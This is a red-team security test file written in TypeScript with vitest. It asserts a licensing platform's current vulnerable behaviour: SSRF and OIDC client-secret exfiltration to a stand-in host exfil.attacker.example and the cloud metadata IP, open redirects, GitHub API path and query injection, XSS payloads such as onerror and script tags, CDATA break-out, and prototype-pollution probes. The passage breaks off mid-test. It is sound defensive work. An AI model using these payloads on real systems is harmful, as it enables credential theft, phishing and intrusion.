/**
 * RED TEAM R9 — injection, SSRF, open redirects, untrusted-input sinks.
 *
 * Every `it()` here is an attacker PoC or an explicit refutation of a hypothesis.
 * Naming convention: `R9-NN` matches docs/security/findings/R9-injection.md.
 *
 * NOTE: these tests assert the CURRENT (vulnerable) behaviour so they fail loudly when a
 * fix lands. Read them as "this is what an attacker can do today".
 */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it, vi } from "vitest";

import { makeTestDb } from "../helpers.js";
import { KvMock } from "../kvMock.js";
import {
  makeEnv,
  NOW,
  seedLicenseWithKey,
  seedProduct,
  seedProductSecret,
} from "../seed.js";
import type { Db } from "../../src/db/types.js";
import type { Env } from "../../src/env.js";
import type { Product } from "../../src/product.js";
import { loadProduct } from "../../src/product.js";
import {
  DEFAULT_AUTO_ISSUE,
  DEFAULT_FINGERPRINT_POLICY,
} from "../../src/fingerprint.js";
import { handleAuthCallback, handleAuthStart } from "../../src/oidc.js";
import { handleMintAuth } from "../../src/edgeMint.js";
import { handleRelease } from "../../src/release/index.js";
import type { FetchImpl } from "../../src/release/githubApp.js";
import { parseRepoUrl } from "../../src/release/linkRepo.js";
import { parseManifest } from "../../src/release/manifest.js";
import { extractSummary } from "../../src/release/changelog.js";
import { renderAppcast } from "../../src/release/appcast.js";
import { applyOverrides } from "../../src/admin/lib/overrides.js";
import { Catalog } from "@polaris-key/catalog";
import { handlePortalApi, handlePortalDownload } from "../../src/portal/api.js";
import { handlePortalLogin } from "../../src/portal/auth.js";
import { getOrCreateAccountByEmail } from "../../src/portal/repo.js";
import {
  PORTAL_COOKIE,
  PORTAL_CSRF_HEADER,
  issuePortalSession,
} from "../../src/portal/session.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const SLUG = "djdl";
const CATALOG_JSON = readFileSync(
  join(HERE, "..", "..", "..", "..", "products", "djdl", "catalog.json"),
  "utf8",
);

// ── shared helpers ───────────────────────────────────────────────────────────

function req(url: string, init?: RequestInit): Request {
  return new Request(url, init) as unknown as Request;
}

/** Record every outbound `globalThis.fetch` (URL + serialized body) and answer 502. */
function recordGlobalFetch(): Array<{ url: string; body: string }> {
  const calls: Array<{ url: string; body: string }> = [];
  vi.spyOn(globalThis, "fetch").mockImplementation(
    async (input: RequestInfo | URL, init?: RequestInit) => {
      const url =
        typeof input === "string"
          ? input
          : input instanceof URL
            ? input.toString()
            : (input as Request).url;
      calls.push({ url, body: init?.body ? String(init.body) : "" });
      // 502 short-circuits handleAuthCallback right after the token POST — which is all
      // we need to prove: the request left the box, addressed at the attacker's host.
      return new Response("nope", { status: 502 });
    },
  );
  return calls;
}

async function seedCustomOidc(
  db: Db,
  issuer: string,
  opts: { redirectUris?: string[] | null; clientSecretSecret?: string } = {},
): Promise<void> {
  await db.run(
    `INSERT INTO oidc_config
       (product, provider, issuer, client_id, client_secret_secret,
        redirect_uris_json, group_role_map_json)
     VALUES (?,?,?,?,?,?,?)`,
    SLUG,
    "custom",
    issuer,
    "client-djdl",
    opts.clientSecretSecret ?? "OIDC_CLIENT_SECRET",
    opts.redirectUris === null
      ? null
      : JSON.stringify(
          opts.redirectUris ?? [`https://key.plrs.im/${SLUG}/auth/callback`],
        ),
    JSON.stringify({ family: { role: "user" } }),
  );
}

function makeProduct(): Product {
  return {
    slug: SLUG,
    name: "djdl",
    signingKid: "kid",
    signingKeyPem: "pem",
    signingPub: null,
    compatMin: "0.0.0",
    compatMax: "99.0.0",
    defaultMaxOfflineDays: 30,
    defaultDeviceLimit: 5,
    adminGroup: null,
    schemaVersion: 1,
    fingerprintPolicy: DEFAULT_FINGERPRINT_POLICY,
    autoIssue: DEFAULT_AUTO_ISSUE,
  };
}

/** Seed release_config; caller overrides any column. */
async function seedReleaseConfig(
  db: Db,
  over: Record<string, unknown> = {},
): Promise<void> {
  const row = {
    product: SLUG,
    gh_owner: "acme",
    gh_repo: "djdl",
    gh_installation_id: 42,
    channel_workflow: "channel.yml",
    beta_branch: "main",
    manual_channels_json: null as string | null,
    binary_name: "djdl",
    install_template: null as string | null,
    sparkle_ed25519_pub: "PUBKEY==",
    summary_marker: "pkey:summary",
    artifact_policy_json: null as string | null,
    metadata_access: "public",
    artifacts_access: "public",
    ...over,
  };
  await db.run(
    `INSERT INTO release_config
       (product, gh_owner, gh_repo, gh_installation_id, channel_workflow, beta_branch,
        manual_channels_json, binary_name, install_template, sparkle_ed25519_pub,
        summary_marker, artifact_policy_json, metadata_access, artifacts_access)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    row.product,
    row.gh_owner,
    row.gh_repo,
    row.gh_installation_id,
    row.channel_workflow,
    row.beta_branch,
    row.manual_channels_json,
    row.binary_name,
    row.install_template,
    row.sparkle_ed25519_pub,
    row.summary_marker,
    row.artifact_policy_json,
    row.metadata_access,
    row.artifacts_access,
  );
}

/** Pre-seed the installation-token KV cache so no App JWT signing is needed. */
async function seedGhToken(env: Env, installId = 42): Promise<void> {
  await env.HOT.put(
    `p:${SLUG}:gh-token:${installId}`,
    JSON.stringify({
      token: "ghs_installation_token",
      expiresAt: 4_000_000_000,
    }),
  );
}

/**
 * A fetchImpl that records every URL. Answers 200 for everything so the engine keeps
 * walking (we only care about which URLs leave the box).
 */
function recordingFetchImpl(releases: unknown[] = []): {
  fetchImpl: FetchImpl;
  calls: string[];
} {
  const calls: string[] = [];
  const fetchImpl: FetchImpl = async (input) => {
    const url = String(input);
    calls.push(url);
    if (url.includes("/releases")) {
      return new Response(JSON.stringify(releases), { status: 200 });
    }
    return new Response(JSON.stringify({ workflow_runs: [] }), { status: 200 });
  };
  return { fetchImpl, calls };
}

/** Swallow the 500 that `handleRelease` produces when a lookup misses (see R9-14). */
async function ignoreMiss(p: Promise<unknown>): Promise<void> {
  await p.catch(() => undefined);
}

afterEach(() => {
  vi.restoreAllMocks();
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-01 — SSRF + OIDC client-secret exfiltration via manifest-controlled issuer
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-01 repo-manifest-controlled OIDC issuer -> SSRF + secret exfil", () => {
  it("the manifest validator accepts http://169.254.169.254 (and any host) as an issuer", () => {
    const res = parseManifest({
      schema: CATALOG_JSON,
      product: JSON.stringify({
        slug: "djdl",
        name: "DJDL",
        oidc: {
          provider: "custom",
          issuer: "http://169.254.169.254/latest/meta-data",
          clientId: "djdl",
          clientSecretSecret: "OIDC_CLIENT_SECRET",
        },
      }),
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    // No scheme/host/IP-literal restriction whatsoever.
    expect(res.manifest.oidc?.issuer).toBe(
      "http://169.254.169.254/latest/meta-data",
    );

    const exfil = parseManifest({
      schema: CATALOG_JSON,
      product: JSON.stringify({
        slug: "djdl",
        name: "DJDL",
        oidc: {
          provider: "custom",
          issuer: "https://exfil.attacker.example",
          clientId: "djdl",
          clientSecretSecret: "OIDC_CLIENT_SECRET",
        },
      }),
    });
    expect(exfil.ok).toBe(true);
  });

  it("POSTs the sealed client_secret to the attacker-chosen issuer host", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(
      db,
      SLUG,
      "OIDC_CLIENT_SECRET",
      "SUPER-SECRET-oidc-client-secret",
    );
    await seedCustomOidc(db, "https://exfil.attacker.example");
    const product = (await loadProduct(env, db, SLUG))!;

    // A flow record is all the attacker needs; GET /djdl/auth/start hands them one.
    await env.HOT.put(
      `p:${SLUG}:flow:ATTACKER_STATE`,
      JSON.stringify({
        verifier: "v",
        nonce: "n",
        redirectUri: `https://key.plrs.im/${SLUG}/auth/callback`,
      }),
    );

    const calls = recordGlobalFetch();
    const res = await handleAuthCallback(
      req(
        `https://key.plrs.im/${SLUG}/auth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE`,
      ),
      env,
      db,
      product,
      NOW,
    );
    expect(res.status).toBe(502); // token exchange "failed" — but it was already sent

    expect(calls).toHaveLength(1);
    expect(calls[0]!.url).toBe("https://exfil.attacker.example/api/oidc/token");
    // The platform's OIDC client secret is in the exfiltrated request body.
    expect(calls[0]!.body).toContain(
      "client_secret=SUPER-SECRET-oidc-client-secret",
    );
    expect(calls[0]!.body).toContain("code=ATTACKER_CODE");
  });

  it("also reaches link-local/IMDS addresses — no IP or scheme guard at the sink", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "http://169.254.169.254/latest/meta-data");
    const product = (await loadProduct(env, db, SLUG))!;
    await env.HOT.put(
      `p:${SLUG}:flow:S`,
      JSON.stringify({
        verifier: "v",
        nonce: "n",
        redirectUri: `https://key.plrs.im/${SLUG}/auth/callback`,
      }),
    );

    const calls = recordGlobalFetch();
    await handleAuthCallback(
      req(`https://key.plrs.im/${SLUG}/auth/callback?code=c&state=S`),
      env,
      db,
      product,
      NOW,
    );
    expect(calls[0]!.url).toBe(
      "http://169.254.169.254/latest/meta-data/api/oidc/token",
    );
  });

  it("the redirect_uris allowlist does NOT constrain the issuer (it only checks our own URI)", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    // Allowlist is populated and correct — and still irrelevant to the issuer host.
    await seedCustomOidc(db, "https://exfil.attacker.example", {
      redirectUris: [`https://key.plrs.im/${SLUG}/auth/callback`],
    });
    const product = (await loadProduct(env, db, SLUG))!;
    await env.HOT.put(
      `p:${SLUG}:flow:S2`,
      JSON.stringify({
        verifier: "v",
        nonce: "n",
        redirectUri: `https://key.plrs.im/${SLUG}/auth/callback`,
      }),
    );
    const calls = recordGlobalFetch();
    await handleAuthCallback(
      req(`https://key.plrs.im/${SLUG}/auth/callback?code=c&state=S2`),
      env,
      db,
      product,
      NOW,
    );
    expect(new URL(calls[0]!.url).host).toBe("exfil.attacker.example");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-02 — unauthenticated open redirect to the manifest-controlled issuer
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-02 /<product>/auth/start is an open redirect to the configured issuer", () => {
  it("302s an anonymous visitor to an arbitrary attacker host", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "https://phish.attacker.example");
    const product = (await loadProduct(env, db, SLUG))!;

    const res = await handleAuthStart(
      req(`https://key.plrs.im/${SLUG}/auth/start`),
      env,
      db,
      product,
    );
    expect(res.status).toBe(302);
    const loc = new URL(res.headers.get("location")!);
    expect(loc.host).toBe("phish.attacker.example");
    expect(loc.pathname).toBe("/authorize");
    // ...and it leaks our client_id + redirect_uri to that host.
    expect(loc.searchParams.get("client_id")).toBe("client-djdl");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-03 — channel_workflow path/query injection on an authenticated GitHub call
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-03 release_config.channel_workflow is interpolated unencoded", () => {
  it("traverses out of /repos/<owner>/<repo>/actions/workflows to any api.github.com path", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, {
      // A `.pkey/release.yaml` value: `channelWorkflow: ../../../../../repos/victim/private/issues?`
      channel_workflow: "../../../../../repos/victim/private/issues?",
    });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/cli/beta/djdl-arm64`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "beta", arch: "arm64" },
        fetchImpl,
      ),
    );

    // FIXED (R6-07 / R9-03): `channel_workflow` is encodeURIComponent'd, so the
    // dot-segments stay inside one path segment and cannot re-target the token-bearing GET.
    for (const url of calls) {
      const parsed = new URL(url);
      expect(parsed.pathname).not.toBe("/repos/victim/private/issues");
      expect(parsed.pathname.split("/")).not.toContain("victim");
    }
    const runs = calls.find((u) => u.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!).pathname).toBe(
      `/repos/acme/${SLUG}/actions/workflows/..%2F..%2F..%2F..%2F..%2Frepos%2Fvictim%2Fprivate%2Fissues%3F/runs`,
    );
  });

  it("query injection: channel_workflow can smuggle its own query string", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, {
      channel_workflow: "wf.yml/runs?actor=evil&",
    });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/cli/beta/djdl-arm64`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "beta", arch: "arm64" },
        fetchImpl,
      ),
    );
    // FIXED (R6-07 / R9-03): the smuggled `?actor=evil&` is percent-encoded into the
    // workflow path segment, so it never becomes a query parameter.
    const runs = calls.find((u) => u.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!).searchParams.get("actor")).toBeNull();
    expect(calls.filter((u) => u.includes("actor=evil"))).toEqual([]);
  });

  it("CONTRAST: beta_branch on the SAME line IS encoded (so this is an oversight, not a design)", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, {
      channel_workflow: "wf.yml",
      beta_branch: "main&injected=1",
    });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/cli/beta/djdl-arm64`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "beta", arch: "arm64" },
        fetchImpl,
      ),
    );
    const runs = calls.find((u) => u.includes("/runs?"))!;
    expect(runs).toContain("branch=main%26injected%3D1");
    expect(new URL(runs).searchParams.get("injected")).toBeNull();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-04 — gh_owner / gh_repo are unencoded too, and parseRepoUrl is permissive
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-04 gh_owner/gh_repo path injection", () => {
  it("parseRepoUrl accepts `..`, `?` and `:` in the owner/repo it persists", () => {
    expect(parseRepoUrl("https://github.com/o/..")).toEqual({
      owner: "o",
      repo: "..",
    });
    expect(parseRepoUrl("https://github.com/o/r?per_page=1")).toEqual({
      owner: "o",
      repo: "r?per_page=1",
    });
    expect(parseRepoUrl("https://github.com/a:b/c:d")).toEqual({
      owner: "a:b",
      repo: "c:d",
    });
    // Feeding that straight into the (unencoded) githubApp URL template traverses:
    const p = parseRepoUrl("https://github.com/o/..")!;
    expect(
      new URL(`https://api.github.com/repos/${p.owner}/${p.repo}/installation`)
        .pathname,
    ).toBe("/repos/installation");
  });

  it("a stored gh_repo of `..` retargets the authenticated releases call", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, { gh_owner: "acme", gh_repo: ".." });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/version`),
        env,
        db,
        makeProduct(),
        "version",
        {},
        fetchImpl,
      ),
    );
    const listed = calls.find((u) => u.includes("/releases"))!;
    // `https://api.github.com/repos/acme/../releases?per_page=100` normalizes away
    // the repo scope entirely.
    expect(new URL(listed).pathname).toBe("/repos/releases");
    expect(listed).toContain("/repos/acme/../releases");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-05 — portal download 302 has no host allowlist + a single-use TOCTOU
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-05 /download/<token> open redirect + single-use race", () => {
  async function seedArtifact(db: Db, sourceUrl: string): Promise<void> {
    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json,
          created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      "https://example.com/releases/1.2.3",
      "authenticated",
      "authenticated",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      1,
      "sha",
      sourceUrl,
      null,
      null,
      "authenticated",
      null,
      NOW,
    );
  }

  async function portalSession(
    env: Env,
    db: Db,
  ): Promise<{ cookie: string; csrf: string }> {
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    const { token, session } = await issuePortalSession(
      env,
      {
        accountId: account.id,
        email: account.primary_email,
        name: account.display_name,
      },
      NOW,
    );
    return { cookie: `${PORTAL_COOKIE}=${token}`, csrf: session.csrf };
  }

  async function mintDownloadUrl(env: Env, db: Db): Promise<string> {
    const s = await portalSession(env, db);
    const path = `/api/releases/${SLUG}/rel_1/artifacts/art_1/token`;
    const res = await handlePortalApi(
      req(`https://key.plrs.im${path}`, {
        method: "POST",
        headers: { cookie: s.cookie, [PORTAL_CSRF_HEADER]: s.csrf },
      }),
      env,
      db,
      path,
      NOW,
    );
    expect(res.status).toBe(201);
    const { url } = (await res.json()) as { url: string };
    return decodeURIComponent(url.replace("/download/", ""));
  }

  it("302s to ANY host stored in release_artifacts.source_url (no allowlist)", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    await seedArtifact(db, "https://malware.attacker.example/pwn.dmg");

    const token = await mintDownloadUrl(env, db);
    const res = await handlePortalDownload(
      req(`https://key.plrs.im/download/${token}`),
      env,
      db,
      token,
      NOW,
    );
    expect(res.status).toBe(302);
    expect(res.headers.get("location")).toBe(
      "https://malware.attacker.example/pwn.dmg",
    );
    // Contrast: release/github.ts:88-95 DOES allowlist redirect targets.
  });

  // FIXED (R9-05b / R11-05): `markPortalDownloadUsed` is now a conditional UPDATE carrying
  // `AND used_at IS NULL`, and the handler treats `changes === 0` as "someone else spent it".
  // The decision moved into the statement, so exactly one of N concurrent redemptions wins no
  // matter how the awaits interleave.
  it("single-use marking is now a compare-and-swap: only one redemption wins", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    await seedArtifact(db, "https://downloads.example.com/djdl.dmg");
    const token = await mintDownloadUrl(env, db);

    // Model real D1 write latency: the `used_at` UPDATE lands one turn late. Any
    // request that got past the `used_at != null` check in that window still wins.
    let release!: () => void;
    const gate = new Promise<void>((r) => {
      release = r;
    });
    const slow: Db = {
      all: db.all.bind(db),
      first: db.first.bind(db),
      batch: db.batch.bind(db),
      run: db.run.bind(db),
      runChanges: async (sql: string, ...params: unknown[]) => {
        if (sql.includes("used_at = ?")) await gate;
        return db.runChanges(sql, ...(params as never[]));
      },
    } as unknown as Db;

    const call = () =>
      handlePortalDownload(
        req(`https://key.plrs.im/download/${token}`),
        env,
        slow,
        token,
        NOW,
      );
    const a = call();
    const b = call();
    // Let both requests get past the `used_at != null` check before either write lands.
    await new Promise((r) => setTimeout(r, 25));
    release();
    const [ra, rb] = await Promise.all([a, b]);
    // Exactly one redemption of a single-use token succeeds.
    expect([ra.status, rb.status].sort()).toEqual([302, 404]);

    // The UPDATE now carries the precondition that makes it a CAS.
    const repoSrc = readFileSync(
      join(HERE, "..", "..", "src", "portal", "repo.ts"),
      "utf8",
    );
    expect(repoSrc).toContain("used_at IS NULL");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-06 — safeReturnTo divergence between the product OIDC flow and the portal
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-06 safeReturnTo: /manage is allowed on the product flow, denied on the portal", () => {
  it("product /auth/start accepts return_to=/manage/... while the portal rejects it", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    env.PLATFORM_OIDC_ISSUER = "https://id.example";
    env.PLATFORM_OIDC_CLIENT_ID = "platform-client";
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "https://id.example", { redirectUris: null });
    const product = (await loadProduct(env, db, SLUG))!;

    const res = await handleAuthStart(
      req(
        `https://key.plrs.im/${SLUG}/auth/start?return_to=${encodeURIComponent(
          "https://key.plrs.im/manage/api/products",
        )}`,
      ),
      env,
      db,
      product,
    );
    expect(res.status).toBe(302); // accepted
    const stored = kv.keys().find((k) => k.startsWith(`p:${SLUG}:flow:`))!;
    const flow = JSON.parse((await kv.get(stored))!) as { returnTo?: string };
    expect(flow.returnTo).toBe("https://key.plrs.im/manage/api/products");

    // The portal twin (portal/auth.ts:100) refuses the same value.
    const portal = await handlePortalLogin(
      req(
        `https://key.plrs.im/login?return_to=${encodeURIComponent(
          "https://key.plrs.im/manage/api/products",
        )}`,
      ),
      env,
      db,
    );
    expect(portal.status).toBe(400);
  });

  it("REFUTED: cross-origin return_to is rejected by both (origin comparison is sound)", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedCustomOidc(db, "https://id.example", { redirectUris: null });
    const product = (await loadProduct(env, db, SLUG))!;
    for (const evil of [
      "https://evil.example/",
      "//evil.example/",
      "https://key.plrs.im.evil.example/",
      "javascript:alert(1)",
      "https:/\\evil.example/",
    ]) {
      const res = await handleAuthStart(
        req(
          `https://key.plrs.im/${SLUG}/auth/start?return_to=${encodeURIComponent(evil)}`,
        ),
        env,
        db,
        product,
      );
      expect([400]).toContain(res.status);
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-07 — stripMarkdown is not an HTML sanitizer
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-07 extractSummary passes raw HTML/script through", () => {
  it("keeps <script>, <img onerror>, and event handlers verbatim in `summary`", () => {
    const body = `<!-- pkey:summary -->
<img src=x onerror=alert(document.domain)><script>fetch('//evil')</script>
<!-- /pkey:summary -->`;
    const summary = extractSummary(body, "pkey:summary")!;
    expect(summary).toContain("<img src=x onerror=alert(document.domain)>");
    expect(summary).toContain("<script>");
    // stripMarkdown only removes emphasis/link/list/heading syntax.
  });

  it("the fallback paragraph path is equally unsanitized", () => {
    const summary = extractSummary("<svg onload=alert(1)>\n\n## Changes")!;
    expect(summary).toBe("<svg onload=alert(1)>");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-08 — appcast CDATA break-out (latent: descriptionHtml is never populated)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-08 renderAppcast CDATA has no `]]>` neutralization", () => {
  it("descriptionHtml can terminate the CDATA section and inject sibling XML", () => {
    const xml = renderAppcast({
      channelTitle: "djdl",
      link: "https://key.plrs.im",
      items: [
        {
          title: "djdl 1.0.0",
          shortVersion: "1.0.0",
          build: "1.0.0",
          url: "https://key.plrs.im/djdl/dmg/1.0.0/djdl-arm64.dmg",
          length: 1,
          pubDate: "Thu, 01 Jan 1970 00:00:00 GMT",
          descriptionHtml:
            "ok]]></description><enclosure url='https://evil'/><description><![CDATA[",
        },
      ],
    });
    expect(xml).toContain("<enclosure url='https://evil'/>");
  });

  it("LATENT: release/index.ts never sets descriptionHtml, so the sink is unreachable today", async () => {
    const src = readFileSync(
      join(HERE, "..", "..", "src", "release", "index.ts"),
      "utf8",
    );
    expect(src).not.toContain("descriptionHtml");
    expect(src).toContain(
      "buildAppcastItem(release, dmg, edSignature, enclosureUrl, {",
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-09 — prototype pollution probes against applyOverrides (REFUTED)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-09 applyOverrides prototype-pollution probes", () => {
  const catalogWith = (key: string) =>
    new Catalog({
      schemaVersion: 1,
      entries: [
        {
          key,
          kind: "value",
          category: "general",
          label: key,
          schema: {},
          default: null,
        },
      ],
    } as never);

  it("REFUTED: a `__proto__` catalog key does not pollute Object.prototype", async () => {
    // applyOverrides is async and env/product-aware since R12-02 (managed secrets are sealed
    // under PLATFORM_KEK before they reach D1). These keys are `kind: "value"`, so nothing is
    // sealed here and the pollution behaviour under test is unchanged.
    const res = await applyOverrides(
      makeEnv(new KvMock(), ["djdl"]),
      "djdl",
      { config: {}, secrets: {}, entitlements: {} },
      [{ key: "__proto__", state: "enforced", value: "pwned" }],
      catalogWith("__proto__"),
      NOW,
    );
    expect(res.ok).toBe(true);
    expect(({} as Record<string, unknown>)["state"]).toBeUndefined();
    expect(({} as Record<string, unknown>)["value"]).toBeUndefined();
    if (!res.ok) return;
    // The assignment hits the Object.prototype __proto__ SETTER, so it silently
    // vanishes from the serialized payload instead of being stored.
    expect(JSON.parse(JSON.stringify(res.payload)).config).toEqual({});
  });

  it("REFUTED: `constructor` / `prototype` keys only shadow on the local object", async () => {
    for (const key of ["constructor", "prototype", "toString"]) {
      const res = await applyOverrides(
        makeEnv(new KvMock(), ["djdl"]),
        "djdl",
        { config: {}, secrets: {}, entitlements: {} },
        [{ key, state: "enforced", value: 1 }],
        catalogWith(key),
        NOW,
      );
      expect(res.ok).toBe(true);
      if (!res.ok) continue;
      const round = JSON.parse(JSON.stringify(res.payload)) as {
        config: Record<string, unknown>;
      };
      expect(round.config[key]).toBeDefined();
    }
    // Object.prototype itself is untouched.
    expect(Object.prototype.hasOwnProperty.call({}, "state")).toBe(false);
    expect(typeof ({} as { constructor: unknown }).constructor).toBe(
      "function",
    );
  });

  it("catalog PUBLISH has no key-name allowlist (the precondition is real)", () => {
    const c = catalogWith("__proto__");
    expect(c.entryByKey("__proto__")).toBeDefined();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-10 — KV key scoping (REFUTED for cross-namespace) + linkRepo mis-scoping
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-10 KV key construction", () => {
  it("REFUTED: a `:`-bearing state cannot escape its own key namespace", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedCustomOidc(db, "https://id.example", { redirectUris: null });
    const product = (await loadProduct(env, db, SLUG))!;

    // Plant a device-flow record and try to reach it through the plain flow reader.
    await kv.put(`p:${SLUG}:device-flow:VICTIM`, JSON.stringify({ x: 1 }));
    await kv.put(`p:${SLUG}:token:VICTIMHASH`, JSON.stringify({ x: 1 }));

    // Every attacker-controlled component is the LAST segment of its key, and no
    // namespace prefix is a prefix of another, so no crafted value collides.
    for (const evil of [
      "../device-flow:VICTIM",
      ":device-flow:VICTIM",
      "..:token:VICTIMHASH",
    ]) {
      const res = await handleAuthCallback(
        req(
          `https://key.plrs.im/${SLUG}/auth/callback?code=c&state=${encodeURIComponent(evil)}`,
        ),
        env,
        db,
        product,
        NOW,
      );
      expect(res.status).toBe(400); // "unknown state" — never resolves cross-namespace
    }
    expect(await kv.get(`p:${SLUG}:device-flow:VICTIM`)).not.toBeNull();
  });

  it("linkRepo scopes the installation-token cache by REPO NAME, not product slug", () => {
    const src = readFileSync(
      join(HERE, "..", "..", "src", "release", "linkRepo.ts"),
      "utf8",
    );
    // `getInstallationToken(env, repo, installId, ...)` — the 2nd arg is `pk()`'s
    // product scope, so the cache key is `p:<repo>:gh-token:<id>`.
    expect(src).toContain(
      "getInstallationToken(env, repo, installId, now, fetchImpl)",
    );
    // ...while every other caller passes the product slug.
    const relSrc = readFileSync(
      join(HERE, "..", "..", "src", "release", "index.ts"),
      "utf8",
    );
    expect(relSrc).toContain("cfg.gh_installation_id");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-11 — /<product>/mint/<id>/auth serves stored HTML with no auth and no CSP
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-11 edge-mint auth page", () => {
  it("serves auth_page_template as raw HTML, unauthenticated — but FIXED (R1-05): with a script-free CSP", async () => {
    const db = makeTestDb();
    await seedProduct(db, SLUG);
    await db.run(
      `INSERT INTO edge_mint_config
         (product, id, alg, signing_key_secret, kid, claims_template_json,
          ttl_seconds, audience, auth_page_template)
       VALUES (?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "musickit",
      "ES256",
      "MINT_KEY",
      "kid",
      "{}",
      3600,
      null,
      "<script>alert(document.domain)</script>",
    );

    const res = await handleMintAuth(db, makeProduct(), "musickit");
    expect(res.status).toBe(200);
    expect(await res.text()).toBe("<script>alert(document.domain)</script>");
    expect(res.headers.get("content-type")).toBe("text/html; charset=utf-8");
    // FIXED (R1-05/R1-09). The stored HTML is still echoed verbatim, but `default-src 'none'`
    // stops the injected <script> from executing on the platform origin.
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("x-frame-options")).toBe("DENY");
  });

  it("REFUTED (today): no code path writes auth_page_template", () => {
